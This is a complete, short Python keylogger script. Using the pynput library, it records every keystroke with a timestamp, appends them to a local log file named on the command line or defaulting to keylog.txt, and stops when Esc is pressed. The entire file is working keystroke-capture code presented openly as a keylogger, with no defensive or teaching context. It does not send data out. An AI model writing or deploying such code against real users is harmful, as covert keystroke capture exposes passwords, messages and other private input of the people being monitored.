# keylogger.py
from pynput import keyboard
from datetime import datetime
import sys

keys = []

def on_press(key):
    global keys
    key_info = {
        "key": str(key),
        "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    keys.append(key_info)
    write_file(key_info)

def write_file(key_info):
    with open(log_file, "a") as f:
        f.write(f"{key_info['time']} - {key_info['key']}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    log_file = sys.argv[1] if len(sys.argv) > 1 else "keylog.txt"
    start_keylogger()
